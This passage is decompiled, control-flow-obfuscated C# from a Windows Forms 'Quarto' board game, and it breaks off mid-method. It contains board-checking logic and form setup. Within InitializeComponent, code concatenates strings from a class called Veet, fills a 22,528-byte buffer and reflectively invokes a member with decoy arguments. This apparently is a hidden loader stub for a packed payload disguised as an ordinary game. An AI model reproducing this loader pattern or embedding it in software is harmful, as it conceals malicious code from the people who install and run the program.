					{
						num44 = -2138411396;
						num45 = -2138411396;
					}
					num = num44 ^ (int)(num2 * 1654803052);
					continue;
				}
				case 55u:
				{
					int num34;
					int num35;
					if (mem[1, 1] == null)
					{
						num34 = -1956493479;
						num35 = -1956493479;
					}
					else
					{
						num34 = -1950837167;
						num35 = -1950837167;
					}
					num = num34 ^ (int)(num2 * 533853919);
					continue;
				}
				case 54u:
				{
					int num21;
					int num22;
					if (mem[num5, 2] != null)
					{
						num21 = -1849169576;
						num22 = -1849169576;
					}
					else
					{
						num21 = -1794752529;
						num22 = -1794752529;
					}
					num = num21 ^ (int)(num2 * 536313648);
					continue;
				}
				case 52u:
				{
					int num16;
					int num17;
					if (mem[2, 2] == null)
					{
						num16 = 2079646318;
						num17 = 2079646318;
					}
					else
					{
						num16 = 71056678;
						num17 = 71056678;
					}
					num = num16 ^ ((int)num2 * -1547520577);
					continue;
				}
				case 51u:
				{
					int num7;
					int num8;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num7 = -2070759064;
						num8 = -2070759064;
					}
					else
					{
						num7 = -451778434;
						num8 = -451778434;
					}
					num = num7 ^ (int)(num2 * 593677606);
					continue;
				}
				case 50u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -1605228718) ^ -445143426;
						continue;
					}
					goto IL_0157;
				case 49u:
					result = flag3;
					num = 1367565158;
					continue;
				case 48u:
					if (mem[0, 3] != null)
					{
						num = 1231820177;
						continue;
					}
					goto IL_005b;
				case 47u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = (int)(num2 * 1545207430) ^ -1718325136;
						continue;
					}
					goto IL_0157;
				case 46u:
					if (mem[0, num5] != null)
					{
						num = 591716809;
						continue;
					}
					goto IL_014b;
				case 45u:
				{
					int num56;
					int num57;
					if (mem[0, num5].Big != mem[1, num5].Big)
					{
						num56 = 2053276306;
						num57 = 2053276306;
					}
					else
					{
						num56 = 1138446999;
						num57 = 1138446999;
					}
					num = num56 ^ ((int)num2 * -151731839);
					continue;
				}
				case 44u:
					num13 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_005c;
				case 43u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = ((int)num2 * -1202006984) ^ -1561505900;
						continue;
					}
					goto IL_0157;
				case 42u:
					if (mem[2, num5].Square != mem[3, num5].Square)
					{
						goto IL_014b;
					}
					goto IL_0157;
				case 41u:
				{
					int num46;
					int num47;
					if (mem[1, num5].Dark != mem[2, num5].Dark)
					{
						num46 = -121337462;
						num47 = -121337462;
					}
					else
					{
						num46 = -1275887186;
						num47 = -1275887186;
					}
					num = num46 ^ ((int)num2 * -31808733);
					continue;
				}
				case 40u:
				{
					int num39;
					int num40;
					if (!flag2)
					{
						num39 = -1991973963;
						num40 = -1991973963;
					}
					else
					{
						num39 = -1978264357;
						num40 = -1978264357;
					}
					num = num39 ^ (int)(num2 * 339822894);
					continue;
				}
				case 39u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 478173713) ^ -1658809481;
						continue;
					}
					goto IL_03cf;
				case 38u:
					num = 524629429;
					continue;
				case 37u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = (int)(num2 * 60166750) ^ -1993855200;
						continue;
					}
					goto IL_014b;
				case 36u:
				{
					int num27;
					int num28;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num27 = 490006888;
						num28 = 490006888;
					}
					else
					{
						num27 = 1902166412;
						num28 = 1902166412;
					}
					num = num27 ^ ((int)num2 * -1423973801);
					continue;
				}
				case 35u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1349047790) ^ -2062255941;
						continue;
					}
					goto IL_005b;
				case 34u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 348908488;
						continue;
					}
					goto IL_014b;
				case 33u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -1819482221) ^ -1132303455;
						continue;
					}
					goto IL_014b;
				case 32u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = (int)(num2 * 416093955) ^ -234939368;
						continue;
					}
					goto IL_0157;
				case 31u:
				{
					int num14;
					int num15;
					if (mem[1, num5].Big != mem[2, num5].Big)
					{
						num14 = 1012825512;
						num15 = 1012825512;
					}
					else
					{
						num14 = 1925544918;
						num15 = 1925544918;
					}
					num = num14 ^ (int)(num2 * 1790537060);
					continue;
				}
				case 30u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -1379561490) ^ 0x10D06D04;
						continue;
					}
					goto IL_005b;
				case 29u:
				{
					int num69;
					int num70;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num69 = -555291559;
						num70 = -555291559;
					}
					else
					{
						num69 = -735084312;
						num70 = -735084312;
					}
					num = num69 ^ ((int)num2 * -139899339);
					continue;
				}
				case 28u:
					num5++;
					num = (int)((num2 * 1642947607) ^ 0x5EFA2210);
					continue;
				case 27u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -568106010) ^ -299459792;
						continue;
					}
					goto IL_03cf;
				case 26u:
				{
					int num66;
					int num67;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num66 = 837903113;
						num67 = 837903113;
					}
					else
					{
						num66 = 1567046121;
						num67 = 1567046121;
					}
					num = num66 ^ (int)(num2 * 211162071);
					continue;
				}
				case 25u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1594861284) ^ 0x4A44724;
						continue;
					}
					goto IL_02c0;
				case 24u:
				{
					int num61;
					int num62;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num61 = -2097648109;
						num62 = -2097648109;
					}
					else
					{
						num61 = -2101406465;
						num62 = -2101406465;
					}
					num = num61 ^ ((int)num2 * -1597597289);
					continue;
				}
				case 23u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)((num2 * 1151493827) ^ 0x1DC7DC0D);
						continue;
					}
					goto IL_09f8;
				case 22u:
					num = ((int)num2 * -684018365) ^ 0x1ED295E0;
					continue;
				case 21u:
				{
					int num59;
					int num60;
					if (mem[3, 3] != null)
					{
						num59 = 1969373817;
						num60 = 1969373817;
					}
					else
					{
						num59 = 926579418;
						num60 = 926579418;
					}
					num = num59 ^ (int)(num2 * 531543042);
					continue;
				}
				case 20u:
				{
					int num54;
					int num55;
					if (mem[num5, 1].Big != mem[num5, 2].Big)
					{
						num54 = 754205894;
						num55 = 754205894;
					}
					else
					{
						num54 = 1326408494;
						num55 = 1326408494;
					}
					num = num54 ^ (int)(num2 * 69829851);
					continue;
				}
				case 19u:
				{
					int num53;
					if (mem[0, num5].Dark != mem[1, num5].Dark)
					{
						num = 689319531;
						num53 = 689319531;
					}
					else
					{
						num = 1462193845;
						num53 = 1462193845;
					}
					continue;
				}
				case 18u:
				{
					int num48;
					int num49;
					if (mem[0, 0].Big != mem[1, 1].Big)
					{
						num48 = 8487543;
						num49 = 8487543;
					}
					else
					{
						num48 = 2017718952;
						num49 = 2017718952;
					}
					num = num48 ^ ((int)num2 * -1236845056);
					continue;
				}
				case 17u:
				{
					int num42;
					int num43;
					if (mem[num5, 3] == null)
					{
						num42 = 1260953639;
						num43 = 1260953639;
					}
					else
					{
						num42 = 1421470483;
						num43 = 1421470483;
					}
					num = num42 ^ ((int)num2 * -1522148868);
					continue;
				}
				case 16u:
					flag3 = true;
					num = (int)((num2 * 918476179) ^ 0x4A9F7388);
					continue;
				case 15u:
					num = (int)((num2 * 2083676919) ^ 0x30B0750A);
					continue;
				case 14u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1670006859;
						continue;
					}
					goto IL_09f8;
				case 13u:
					flag3 = true;
					num = (int)(num2 * 1811110811) ^ -2014859766;
					continue;
				case 12u:
					if (mem[3, num5] != null)
					{
						num = ((int)num2 * -826205853) ^ -1273594028;
						continue;
					}
					goto IL_014b;
				case 11u:
				{
					int num38;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 2142619036;
						num38 = 2142619036;
					}
					else
					{
						num = 2120822029;
						num38 = 2120822029;
					}
					continue;
				}
				case 10u:
				{
					int num36;
					int num37;
					if (mem[num5, 1] == null)
					{
						num36 = 1394007551;
						num37 = 1394007551;
					}
					else
					{
						num36 = 1850879568;
						num37 = 1850879568;
					}
					num = num36 ^ ((int)num2 * -885878192);
					continue;
				}
				case 9u:
				{
					int num29;
					int num30;
					if (mem[0, 0] != null)
					{
						num29 = -1889393480;
						num30 = -1889393480;
					}
					else
					{
						num29 = -945950431;
						num30 = -945950431;
					}
					num = num29 ^ (int)(num2 * 581190661);
					continue;
				}
				case 8u:
				{
					int num25;
					int num26;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num25 = 304673500;
						num26 = 304673500;
					}
					else
					{
						num25 = 981389042;
						num26 = 981389042;
					}
					num = num25 ^ ((int)num2 * -511873267);
					continue;
				}
				case 7u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = (int)(num2 * 444266847) ^ -171380496;
						continue;
					}
					goto IL_0157;
				case 6u:
				{
					int num20;
					if (mem[num5, 0] == null)
					{
						num = 1971955279;
						num20 = 1971955279;
					}
					else
					{
						num = 65204929;
						num20 = 65204929;
					}
					continue;
				}
				case 5u:
					flag3 = false;
					num5 = 0;
					num = (int)(num2 * 1460445951) ^ -317092467;
					continue;
				case 4u:
				{
					int num18;
					int num19;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num18 = -1228983895;
						num19 = -1228983895;
					}
					else
					{
						num18 = -1293315382;
						num19 = -1293315382;
					}
					num = num18 ^ (int)(num2 * 2044472584);
					continue;
				}
				case 3u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = (int)((num2 * 1235872530) ^ 0x7E9F821E);
						continue;
					}
					goto IL_0157;
				case 2u:
				{
					int num9;
					int num10;
					if (!flag)
					{
						num9 = -977345465;
						num10 = -977345465;
					}
					else
					{
						num9 = -865763747;
						num10 = -865763747;
					}
					num = num9 ^ (int)(num2 * 768944593);
					continue;
				}
				case 1u:
				{
					int num3;
					int num4;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num3 = -755798290;
						num4 = -755798290;
					}
					else
					{
						num3 = -453951673;
						num4 = -453951673;
					}
					num = num3 ^ (int)(num2 * 1004002743);
					continue;
				}
				case 0u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -218108515) ^ 0xECC97CC;
						continue;
					}
					goto IL_02c0;
				case 65u:
					break;
				default:
					{
						return result;
					}
					IL_005b:
					num13 = 0;
					goto IL_005c;
					IL_005c:
					flag2 = (byte)num13 != 0;
					num = 1167009476;
					continue;
					IL_02c0:
					num13 = 1;
					goto IL_005c;
					IL_03cf:
					num13 = 1;
					goto IL_005c;
					IL_09f8:
					num13 = 0;
					goto IL_005c;
					IL_0157:
					num = 573130141;
					num68 = 573130141;
					continue;
					IL_014b:
					num = 780284721;
					num68 = 780284721;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num5 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1453365805;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x136B5792u) % 15u)
				{
				case 14u:
					num = ((int)num2 * -1257633130) ^ 0x49D5AC42;
					continue;
				case 13u:
					num = ((int)num2 * -52952112) ^ 0x3899A178;
					continue;
				case 12u:
					num5 = 0;
					num = 104622260;
					continue;
				case 11u:
					flag = false;
					num = (int)((num2 * 1321162872) ^ 0x280A322B);
					continue;
				case 10u:
					num = ((int)num2 * -471042053) ^ 0x36EB35A2;
					continue;
				case 9u:
				{
					int num8;
					if (mem[num3, num5] != null)
					{
						num = 747971827;
						num8 = 747971827;
					}
					else
					{
						num = 970747111;
						num8 = 970747111;
					}
					continue;
				}
				case 8u:
					num3 = 0;
					num = (int)((num2 * 1638688739) ^ 0x21E576EA);
					continue;
				case 6u:
				{
					int num6;
					int num7;
					if (!flag2)
					{
						num6 = 1436199611;
						num7 = 1436199611;
					}
					else
					{
						num6 = 36656717;
						num7 = 36656717;
					}
					num = num6 ^ (int)(num2 * 619211135);
					continue;
				}
				case 5u:
					result = flag;
					num = ((int)num2 * -1895413985) ^ 0x295CA376;
					continue;
				case 4u:
					num5++;
					num = 1992806406;
					continue;
				case 2u:
					num3++;
					num = ((int)num2 * -139808091) ^ -132316294;
					continue;
				case 1u:
					flag2 = num5 < 4;
					num = 183440820;
					continue;
				case 0u:
				{
					int num4;
					if (num3 < 4)
					{
						num = 1021725013;
						num4 = 1021725013;
					}
					else
					{
						num = 1904119072;
						num4 = 1904119072;
					}
					continue;
				}
				case 7u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -487927748;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8DDC987Bu) % 5u)
				{
				case 4u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)(num2 * 1409255160) ^ -1200554990;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)(num2 * 1512481990) ^ -312812088;
					continue;
				case 1u:
					num = ((int)num2 * -864059839) ^ 0x5385D144;
					continue;
				case 2u:
					break;
				default:
					Form1.smethod_32((Control)(object)label2, "");
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1470576500;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0x8A7436F0u) % 9u)
				{
				case 8u:
					((Form)this).Dispose(disposing);
					num = -350055750;
					continue;
				case 6u:
					if (disposing)
					{
						num = ((int)num2 * -941012803) ^ 0x6A3F0128;
						continue;
					}
					num5 = 0;
					goto IL_002a;
				case 5u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_002a;
				case 4u:
					num = (int)((num2 * 732961987) ^ 0x15542878);
					continue;
				case 3u:
					num = (int)((num2 * 910784858) ^ 0x7393B8D3);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 896442963;
						num4 = 896442963;
					}
					else
					{
						num3 = 1114862801;
						num4 = 1114862801;
					}
					num = num3 ^ ((int)num2 * -1176136787);
					continue;
				}
				case 0u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -785550700) ^ -1989578259;
					continue;
				default:
					return;
				case 2u:
					break;
				case 7u:
					return;
					IL_002a:
					flag = (byte)num5 != 0;
					num = -2100454110;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		string string_ = default(string);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		bool flag = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num = -546976802;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x897D582Du) % 127u)
				{
				case 126u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -1622540103) ^ 0x5807E65C;
					continue;
				case 125u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = (int)(num2 * 1479206564) ^ -1923125783;
					continue;
				case 124u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1239191126) ^ 0x23090CF3;
					continue;
				case 123u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 141345159) ^ -845347683;
					continue;
				case 122u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1051721134) ^ -1524815741;
					continue;
				case 120u:
					Form1.smethod_59((Control)(object)this);
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -982108999) ^ -643731734;
					continue;
				case 119u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -521735439) ^ -954335228;
					continue;
				case 118u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -859034758) ^ 0x2CF27BEC;
					continue;
				case 117u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -1961268385) ^ 0x3F36B8D5;
					continue;
				case 116u:
					timer1 = Form1.smethod_56(components);
					num = (int)((num2 * 311709876) ^ 0x709BD482);
					continue;
				case 115u:
					num = ((int)num2 * -103631694) ^ 0x6F3C3023;
					continue;
				case 114u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -635585503) ^ -552319858;
					continue;
				case 113u:
					string_ = Veet.Sa;
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = (int)((num2 * 707669216) ^ 0x31FAF31E);
					continue;
				case 112u:
					num = (int)(num2 * 1451745368) ^ -769736037;
					continue;
				case 111u:
					num = ((int)num2 * -147590561) ^ 0x53E9EE88;
					continue;
				case 110u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -278289088) ^ 0x1C717E7;
					continue;
				case 109u:
					num = ((int)num2 * -588106084) ^ -331244273;
					continue;
				case 108u:
					label1 = Form1.smethod_57();
					num = (int)(num2 * 981115787) ^ -1503367232;
					continue;
				case 107u:
					num = ((int)num2 * -1054655461) ^ 0x4FA4399;
					continue;
				case 106u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = (int)(num2 * 1635306704) ^ -2114189994;
					continue;
				case 105u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1680657688) ^ -1247885025;
					continue;
				case 104u:
					num = ((int)num2 * -1902665075) ^ 0xA161799;
					continue;
				case 103u:
					num = (int)((num2 * 951890024) ^ 0x271717CD);
					continue;
				case 102u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1044106742) ^ -1824411057;
					continue;
				case 101u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1187496567) ^ -998775228;
					continue;
				case 100u:
					num = (int)((num2 * 1619059544) ^ 0x766F215D);
					continue;
				case 99u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -148028685) ^ 0x26FF2E47;
					continue;
				case 98u:
					flag = num3 < 22528;
					num = -875141307;
					continue;
				case 97u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1009723692) ^ -114108903;
					continue;
				case 96u:
					num = (int)(num2 * 85641199) ^ -1317388869;
					continue;
				case 95u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 1662467543) ^ 0x43520545);
					continue;
				case 94u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -310191265) ^ -885104141;
					continue;
				case 93u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 683301499) ^ -1592774442;
					continue;
				case 92u:
					num = ((int)num2 * -139393581) ^ -2015967391;
					continue;
				case 91u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)((num2 * 1512821419) ^ 0x661B02BD);
					continue;
				case 90u:
					num = (int)((num2 * 117721048) ^ 0x325D7F84);
					continue;
				case 89u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 718506540) ^ -283355735;
					continue;
				case 88u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -886769256) ^ 0x405F5B77;
					continue;
				case 87u:
					num = (int)((num2 * 1520015537) ^ 0x57C91B9C);
					continue;
				case 86u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -96309816) ^ -127140588;
					continue;
				case 85u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -377708634) ^ 0x61B1174;
					continue;
				case 84u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1035237138) ^ -1955647911;
					continue;
				case 83u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -353030593) ^ -219274731;
					continue;
				case 82u:
					num = (int)((num2 * 1936743564) ^ 0x6EF1C86B);
					continue;
				case 81u:
					num = ((int)num2 * -969585350) ^ 0xD46E1CD;
					continue;
				case 80u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -1688181627) ^ 0x36914E9;
					continue;
				case 79u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -2086458242) ^ -1729432251;
					continue;
				case 78u:
					Form1.smethod_61((Control)(object)label1, "label1");
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)((num2 * 905027944) ^ 0x8703691);
					continue;
				case 77u:
					num = (int)(num2 * 1836719162) ^ -871277794;
					continue;
				case 76u:
					Form1.smethod_61((Control)(object)button1, "button1");
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 81530491) ^ 0x2FFF2261);
					continue;
				case 75u:
					num = (int)((num2 * 1466229123) ^ 0x78D85C8B);
					continue;
				case 74u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 895496937) ^ -1880302067;
					continue;
				case 73u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 2009160468) ^ -407318094;
					continue;
				case 72u:
					Form1.smethod_64((Control)(object)button1, 5);
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = ((int)num2 * -380243432) ^ -129298143;
					continue;
				case 71u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)((num2 * 73157576) ^ 0x1DE723FD);
					continue;
				case 70u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -1883929931) ^ 0x1DF61802;
					continue;
				case 69u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -68759258) ^ -1285367482;
					continue;
				case 68u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 1487146339) ^ 0x53B7F03C);
					continue;
				case 67u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 1717565820) ^ 0x661090F3);
					continue;
				case 66u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -1946870954) ^ -28201203;
					continue;
				case 65u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -66313173) ^ -1281218079;
					continue;
				case 64u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1688874344) ^ -450327839;
					continue;
				case 63u:
					pictureBox1 = Form1.smethod_2();
					num = (int)(num2 * 492750801) ^ -2035237883;
					continue;
				case 62u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -582494598) ^ -1375867268;
					continue;
				case 61u:
					num = ((int)num2 * -710688013) ^ -657083327;
					continue;
				case 60u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 1379054070) ^ 0x6BA52CB);
					continue;
				case 59u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1063386590) ^ -161745640;
					continue;
				case 58u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 193901086) ^ -1914057814;
					continue;
				case 57u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1188654305) ^ -1666661993;
					continue;
				case 56u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = (int)((num2 * 293090603) ^ 0x9AF4790);
					continue;
				case 55u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)(num2 * 1626053121) ^ -2056119582;
					continue;
				case 54u:
					num = (int)((num2 * 728762518) ^ 0x5785B345);
					continue;
				case 53u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -735629679) ^ 0x3A6D9EDD;
					continue;
				case 52u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -88322626) ^ 0xAC369B2;
					continue;
				case 51u:
					components = Form1.smethod_52();
					num = (int)(num2 * 1063424160) ^ -1482946890;
					continue;
				case 50u:
					num3 = 0;
					num = ((int)num2 * -361993011) ^ -1152005824;
					continue;
				case 49u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 831768382) ^ 0x7F15AF17);
					continue;
				case 48u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -15656812) ^ -1280054127;
					continue;
				case 47u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -910987044) ^ 0x7C68C2DB;
					continue;
				case 45u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -760402906;
						num5 = -760402906;
					}
					else
					{
						num4 = -1927602219;
						num5 = -1927602219;
					}
					num = num4 ^ ((int)num2 * -117600784);
					continue;
				}
				case 44u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 1837643374) ^ 0x3EEA74CB);
					continue;
				case 43u:
					num = -492353623;
					continue;
				case 42u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)(num2 * 1368815344) ^ -1399524102;
					continue;
				case 41u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1411351632) ^ -113868836;
					continue;
				case 40u:
					num = ((int)num2 * -1296725830) ^ -834477146;
					continue;
				case 39u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -85635925) ^ 0x5CC6B6B5;
					continue;
				case 38u:
					num = ((int)num2 * -1240374876) ^ -1246509485;
					continue;
				case 37u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 688837688) ^ 0x34D2EDE);
					continue;
				case 36u:
					num = (int)((num2 * 1666645407) ^ 0x35DEF4A4);
					continue;
				case 35u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1814062604) ^ -1909059025;
					continue;
				case 34u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -1781468791) ^ 0x4020F594;
					continue;
				case 33u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1005425619) ^ -931213961;
					continue;
				case 32u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = ((int)num2 * -145992351) ^ 0x29825933;
					continue;
				case 31u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)(num2 * 1453099286) ^ -1192853184;
					continue;
				case 30u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -43217966) ^ 0x62FA9983;
					continue;
				case 29u:
					num = (int)(num2 * 1186138826) ^ -1556479323;
					continue;
				case 28u:
					num = ((int)num2 * -771105554) ^ -1578177615;
					continue;
				case 27u:
					num = (int)((num2 * 255865496) ^ 0x7CB37168);
					continue;
				case 26u:
					num = (int)(num2 * 1523841489) ^ -299399516;
					continue;
				case 25u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 485695587) ^ 0x69C51E02);
					continue;
				case 24u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 656967162) ^ 0x7273B929);
					continue;
				case 23u:
					num = (int)(num2 * 739895212) ^ -1800973591;
					continue;
				case 22u:
					num3++;
					num = ((int)num2 * -530271982) ^ 0x129F000E;
					continue;
				case 21u:
					num = (int)(num2 * 237040319) ^ -1478172275;
					continue;
				case 20u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 1196169372) ^ 0x6477196A);
					continue;
				case 19u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 568715620) ^ -35877782;
					continue;
				case 18u:
					num = ((int)num2 * -1722280561) ^ -476447343;
					continue;
				case 17u:
